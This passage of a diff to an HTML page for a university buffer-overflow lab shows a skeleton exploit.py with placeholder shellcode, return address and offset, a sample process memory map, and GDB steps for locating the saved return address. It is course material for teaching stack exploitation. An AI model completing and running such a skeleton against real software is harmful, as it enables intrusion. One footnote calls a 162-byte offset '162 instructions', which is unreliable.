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" title="x86 registers" style="width:60.0%" /> </div>
 <div style="display: flex; justify-content: center;"> x86 registers
 </div></p>
 <p>(Diagram of x86 registers from University of Virginia cs216 <a href="https://www.cs.virginia.edu/~evans/cs216/guides/x86.html"><em>x86
@@ -888,35 +923,35 @@ provides a helpful one.) We provide a skeleton program called
 <code>exploit.py</code>, which is included in the lab zip file. The code
 is incomplete, and you will need to replace some of the essential values
 in the code (marked with an <code>XXX</code>):</p>
-<div class="sourceCode" id="cb18"><pre class="sourceCode numberSource python numberLines"><code class="sourceCode python"><span id="cb18-1"><a href="#cb18-1"></a><span class="co">#!/usr/bin/python3</span></span>
-<span id="cb18-2"><a href="#cb18-2"></a><span class="im">import</span> sys</span>
-<span id="cb18-3"><a href="#cb18-3"></a></span>
-<span id="cb18-4"><a href="#cb18-4"></a><span class="co"># XXX - replace the content with the actual shellcode</span></span>
-<span id="cb18-5"><a href="#cb18-5"></a>shellcode<span class="op">=</span> (</span>
-<span id="cb18-6"><a href="#cb18-6"></a>  <span class="st">&quot;</span><span class="ch">\x90\x90\x90\x90</span><span class="st">&quot;</span></span>
-<span id="cb18-7"><a href="#cb18-7"></a>  <span class="st">&quot;</span><span class="ch">\x90\x90\x90\x90</span><span class="st">&quot;</span></span>
-<span id="cb18-8"><a href="#cb18-8"></a>).encode(<span class="st">&#39;latin-1&#39;</span>)</span>
-<span id="cb18-9"><a href="#cb18-9"></a></span>
-<span id="cb18-10"><a href="#cb18-10"></a><span class="co"># Fill the content with NOP&#39;s</span></span>
-<span id="cb18-11"><a href="#cb18-11"></a>content <span class="op">=</span> <span class="bu">bytearray</span>(<span class="bn">0x90</span> <span class="cf">for</span> i <span class="kw">in</span> <span class="bu">range</span>(<span class="dv">517</span>))</span>
-<span id="cb18-12"><a href="#cb18-12"></a></span>
-<span id="cb18-13"><a href="#cb18-13"></a><span class="co">##################################################################</span></span>
-<span id="cb18-14"><a href="#cb18-14"></a><span class="co"># Put the shellcode somewhere in the payload</span></span>
-<span id="cb18-15"><a href="#cb18-15"></a>start <span class="op">=</span> <span class="dv">0</span>               <span class="co"># XXX - change this number</span></span>
-<span id="cb18-16"><a href="#cb18-16"></a>content[start:start <span class="op">+</span> <span class="bu">len</span>(shellcode)] <span class="op">=</span> shellcode</span>
-<span id="cb18-17"><a href="#cb18-17"></a></span>
-<span id="cb18-18"><a href="#cb18-18"></a><span class="co"># Decide the return address value</span></span>
-<span id="cb18-19"><a href="#cb18-19"></a><span class="co"># and put it somewhere in the payload</span></span>
-<span id="cb18-20"><a href="#cb18-20"></a>ret    <span class="op">=</span> <span class="bn">0x00</span>           <span class="co"># XXX - change this number</span></span>
-<span id="cb18-21"><a href="#cb18-21"></a>offset <span class="op">=</span> <span class="dv">0</span>              <span class="co"># XXX - change this number</span></span>
-<span id="cb18-22"><a href="#cb18-22"></a></span>
-<span id="cb18-23"><a href="#cb18-23"></a>L <span class="op">=</span> <span class="dv">4</span>     <span class="co"># Use 4 for 32-bit address and 8 for 64-bit address</span></span>
-<span id="cb18-24"><a href="#cb18-24"></a>content[offset:offset <span class="op">+</span> L] <span class="op">=</span> (ret).to_bytes(L,byteorder<span class="op">=</span><span class="st">&#39;little&#39;</span>)</span>
-<span id="cb18-25"><a href="#cb18-25"></a><span class="co">##################################################################</span></span>
-<span id="cb18-26"><a href="#cb18-26"></a></span>
-<span id="cb18-27"><a href="#cb18-27"></a><span class="co"># Write the content to a file</span></span>
-<span id="cb18-28"><a href="#cb18-28"></a><span class="cf">with</span> <span class="bu">open</span>(<span class="st">&#39;badfile&#39;</span>, <span class="st">&#39;wb&#39;</span>) <span class="im">as</span> f:</span>
-<span id="cb18-29"><a href="#cb18-29"></a>  f.write(content)</span></code></pre></div>
+<div class="sourceCode" id="cb19"><pre class="sourceCode numberSource python numberLines"><code class="sourceCode python"><span id="cb19-1"><a href="#cb19-1"></a><span class="co">#!/usr/bin/python3</span></span>
+<span id="cb19-2"><a href="#cb19-2"></a><span class="im">import</span> sys</span>
+<span id="cb19-3"><a href="#cb19-3"></a></span>
+<span id="cb19-4"><a href="#cb19-4"></a><span class="co"># XXX - replace the content with the actual shellcode</span></span>
+<span id="cb19-5"><a href="#cb19-5"></a>shellcode<span class="op">=</span> (</span>
+<span id="cb19-6"><a href="#cb19-6"></a>  <span class="st">&quot;</span><span class="ch">\x90\x90\x90\x90</span><span class="st">&quot;</span></span>
+<span id="cb19-7"><a href="#cb19-7"></a>  <span class="st">&quot;</span><span class="ch">\x90\x90\x90\x90</span><span class="st">&quot;</span></span>
+<span id="cb19-8"><a href="#cb19-8"></a>).encode(<span class="st">&#39;latin-1&#39;</span>)</span>
+<span id="cb19-9"><a href="#cb19-9"></a></span>
+<span id="cb19-10"><a href="#cb19-10"></a><span class="co"># Fill the content with NOP&#39;s</span></span>
+<span id="cb19-11"><a href="#cb19-11"></a>content <span class="op">=</span> <span class="bu">bytearray</span>(<span class="bn">0x90</span> <span class="cf">for</span> i <span class="kw">in</span> <span class="bu">range</span>(<span class="dv">517</span>))</span>
+<span id="cb19-12"><a href="#cb19-12"></a></span>
+<span id="cb19-13"><a href="#cb19-13"></a><span class="co">##################################################################</span></span>
+<span id="cb19-14"><a href="#cb19-14"></a><span class="co"># Put the shellcode somewhere in the payload</span></span>
+<span id="cb19-15"><a href="#cb19-15"></a>start <span class="op">=</span> <span class="dv">0</span>               <span class="co"># XXX - change this number</span></span>
+<span id="cb19-16"><a href="#cb19-16"></a>content[start:start <span class="op">+</span> <span class="bu">len</span>(shellcode)] <span class="op">=</span> shellcode</span>
+<span id="cb19-17"><a href="#cb19-17"></a></span>
+<span id="cb19-18"><a href="#cb19-18"></a><span class="co"># Decide the return address value</span></span>
+<span id="cb19-19"><a href="#cb19-19"></a><span class="co"># and put it somewhere in the payload</span></span>
+<span id="cb19-20"><a href="#cb19-20"></a>ret    <span class="op">=</span> <span class="bn">0x00</span>           <span class="co"># XXX - change this number</span></span>
+<span id="cb19-21"><a href="#cb19-21"></a>offset <span class="op">=</span> <span class="dv">0</span>              <span class="co"># XXX - change this number</span></span>
+<span id="cb19-22"><a href="#cb19-22"></a></span>
+<span id="cb19-23"><a href="#cb19-23"></a>L <span class="op">=</span> <span class="dv">4</span>     <span class="co"># Use 4 for 32-bit address and 8 for 64-bit address</span></span>
+<span id="cb19-24"><a href="#cb19-24"></a>content[offset:offset <span class="op">+</span> L] <span class="op">=</span> (ret).to_bytes(L,byteorder<span class="op">=</span><span class="st">&#39;little&#39;</span>)</span>
+<span id="cb19-25"><a href="#cb19-25"></a><span class="co">##################################################################</span></span>
+<span id="cb19-26"><a href="#cb19-26"></a></span>
+<span id="cb19-27"><a href="#cb19-27"></a><span class="co"># Write the content to a file</span></span>
+<span id="cb19-28"><a href="#cb19-28"></a><span class="cf">with</span> <span class="bu">open</span>(<span class="st">&#39;badfile&#39;</span>, <span class="st">&#39;wb&#39;</span>) <span class="im">as</span> f:</span>
+<span id="cb19-29"><a href="#cb19-29"></a>  f.write(content)</span></code></pre></div>
 <p>You will need to change the <code>exploit.py</code> code to:</p>
 <ul>
 <li>Write the correct sequence of shellcode bytes, at line 5.
@@ -990,22 +1025,22 @@ ID</em>. If you run <code>cat /proc/<em>process_id</em>/maps</code>
 (replacing <em>process_id</em> with the process ID of the
 <code>stack-L1-dbg</code> process), you should get output like the
 following:</p>
-<div class="sourceCode" id="cb21"><pre class="sourceCode numberSource numberLines"><code class="sourceCode"><span id="cb21-1"><a href="#cb21-1"></a>56555000-56558000 r-xp 00000000 fc:03 393228          /home/vagrant/lab04-code/code/stack-L1-dbg</span>
-<span id="cb21-2"><a href="#cb21-2"></a>56558000-56559000 r-xp 00002000 fc:03 393228          /home/vagrant/lab04-code/code/stack-L1-dbg</span>
-<span id="cb21-3"><a href="#cb21-3"></a>56559000-5655a000 rwxp 00003000 fc:03 393228          /home/vagrant/lab04-code/code/stack-L1-dbg</span>
-<span id="cb21-4"><a href="#cb21-4"></a>5655a000-5657c000 rwxp 00000000 00:00 0               [heap]</span>
-<span id="cb21-5"><a href="#cb21-5"></a>f7dd5000-f7fba000 r-xp 00000000 fc:03 1847105         /usr/lib32/libc-2.31.so</span>
-<span id="cb21-6"><a href="#cb21-6"></a>f7fba000-f7fbb000 ---p 001e5000 fc:03 1847105         /usr/lib32/libc-2.31.so</span>
-<span id="cb21-7"><a href="#cb21-7"></a>f7fbb000-f7fbd000 r-xp 001e5000 fc:03 1847105         /usr/lib32/libc-2.31.so</span>
-<span id="cb21-8"><a href="#cb21-8"></a>f7fbd000-f7fbe000 rwxp 001e7000 fc:03 1847105         /usr/lib32/libc-2.31.so</span>
-<span id="cb21-9"><a href="#cb21-9"></a>f7fbe000-f7fc1000 rwxp 00000000 00:00 0</span>
-<span id="cb21-10"><a href="#cb21-10"></a>f7fcb000-f7fcd000 rwxp 00000000 00:00 0</span>
-<span id="cb21-11"><a href="#cb21-11"></a>f7fcd000-f7fd0000 r--p 00000000 00:00 0               [vvar]</span>
-<span id="cb21-12"><a href="#cb21-12"></a>f7fd0000-f7fd1000 r-xp 00000000 00:00 0               [vdso]</span>
-<span id="cb21-13"><a href="#cb21-13"></a>f7fd1000-f7ffb000 r-xp 00000000 fc:03 1847101         /usr/lib32/ld-2.31.so</span>
-<span id="cb21-14"><a href="#cb21-14"></a>f7ffc000-f7ffd000 r-xp 0002a000 fc:03 1847101         /usr/lib32/ld-2.31.so</span>
-<span id="cb21-15"><a href="#cb21-15"></a>f7ffd000-f7ffe000 rwxp 0002b000 fc:03 1847101         /usr/lib32/ld-2.31.so</span>
-<span id="cb21-16"><a href="#cb21-16"></a>fffdd000-ffffe000 rwxp 00000000 00:00 0               [stack]</span></code></pre></div>
+<div class="sourceCode" id="cb22"><pre class="sourceCode numberSource numberLines"><code class="sourceCode"><span id="cb22-1"><a href="#cb22-1"></a>56555000-56558000 r-xp 00000000 fc:03 393228          /home/vagrant/lab04-code/code/stack-L1-dbg</span>
+<span id="cb22-2"><a href="#cb22-2"></a>56558000-56559000 r-xp 00002000 fc:03 393228          /home/vagrant/lab04-code/code/stack-L1-dbg</span>
+<span id="cb22-3"><a href="#cb22-3"></a>56559000-5655a000 rwxp 00003000 fc:03 393228          /home/vagrant/lab04-code/code/stack-L1-dbg</span>
+<span id="cb22-4"><a href="#cb22-4"></a>5655a000-5657c000 rwxp 00000000 00:00 0               [heap]</span>
+<span id="cb22-5"><a href="#cb22-5"></a>f7dd5000-f7fba000 r-xp 00000000 fc:03 1847105         /usr/lib32/libc-2.31.so</span>
+<span id="cb22-6"><a href="#cb22-6"></a>f7fba000-f7fbb000 ---p 001e5000 fc:03 1847105         /usr/lib32/libc-2.31.so</span>
+<span id="cb22-7"><a href="#cb22-7"></a>f7fbb000-f7fbd000 r-xp 001e5000 fc:03 1847105         /usr/lib32/libc-2.31.so</span>
+<span id="cb22-8"><a href="#cb22-8"></a>f7fbd000-f7fbe000 rwxp 001e7000 fc:03 1847105         /usr/lib32/libc-2.31.so</span>
+<span id="cb22-9"><a href="#cb22-9"></a>f7fbe000-f7fc1000 rwxp 00000000 00:00 0</span>
+<span id="cb22-10"><a href="#cb22-10"></a>f7fcb000-f7fcd000 rwxp 00000000 00:00 0</span>
+<span id="cb22-11"><a href="#cb22-11"></a>f7fcd000-f7fd0000 r--p 00000000 00:00 0               [vvar]</span>
+<span id="cb22-12"><a href="#cb22-12"></a>f7fd0000-f7fd1000 r-xp 00000000 00:00 0               [vdso]</span>
+<span id="cb22-13"><a href="#cb22-13"></a>f7fd1000-f7ffb000 r-xp 00000000 fc:03 1847101         /usr/lib32/ld-2.31.so</span>
+<span id="cb22-14"><a href="#cb22-14"></a>f7ffc000-f7ffd000 r-xp 0002a000 fc:03 1847101         /usr/lib32/ld-2.31.so</span>
+<span id="cb22-15"><a href="#cb22-15"></a>f7ffd000-f7ffe000 rwxp 0002b000 fc:03 1847101         /usr/lib32/ld-2.31.so</span>
+<span id="cb22-16"><a href="#cb22-16"></a>fffdd000-ffffe000 rwxp 00000000 00:00 0               [stack]</span></code></pre></div>
 <p>This gives you a picture of the process’s virtual memory<a href="#fn4" class="footnote-ref" id="fnref4" role="doc-noteref"><sup>4</sup></a> – memory addresses are in the
 leftmost column, with permissions for each memory segment
 (e.g. <strong>r</strong>ead, <strong>w</strong>rite and
@@ -1122,7 +1157,7 @@ currently being executed.</li>
 of <code>bof</code>. (If you like, you can confirm this by issuing the
 GDB command <code>print   bof</code> – that will tell you where the
 <em>first</em> instruction in <code>bof</code> is located – and checking
-that it’s equal to <em>address_in_eip</em> <span class="math inline">−</span> 21.</li>
+that it’s equal to <em>address_in_eip</em> <span class="math inline">\(-\)</span> 21.</li>
 </ul>
 <p>Now let’s do the same for the <em>saved</em> <code>eip</code>.</p>
 <div style="border: solid 2pt blue; background-color: hsla(241, 100%,50%, 0.1); padding: 1em; border-radius: 5pt; margin-top: 1em;">
@@ -1254,11 +1289,10 @@ purposes, you don’t need to know that the “p” means. (But if you’re
 interested – it indicates a <a href="https://en.wikipedia.org/wiki/Copy-on-write">copy-on-write</a>
 memory segment.)<a href="#fnref4" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
 <li id="fn5"><p>A little math tells us that (<em>location_in_main</em>
-<span class="math inline">−</span> <em>start_of_main</em>) = <span class="math inline">(0<em>x</em>56556382−0<em>x</em>565562<em>e</em>0)</span>
-= 162; we’re 162 instructions past the start of the <code>main</code>
-function. If we wanted, we could view the precise assembly language
-instructions being executed, by issuing the GDB command
-<code>layout asm</code>.<a href="#fnref5" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
+<span class="math inline">\(-\)</span> <em>start_of_main</em>) = <span class="math inline">\((0x56556382 - 0x565562e0)\)</span> = 162; we’re
+162 instructions past the start of the <code>main</code> function. If we
+wanted, we could view the precise assembly language instructions being
+executed, by issuing the GDB command <code>layout asm</code>.<a href="#fnref5" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
 <li id="fn6"><p>Technically, it would be more appropriate to treat
 <code>$saved_eip</code> as a “pointer to <code>intptr_t</code>” or as a
 “pointer to a function pointer” – but “<code>size_t</code>” is much
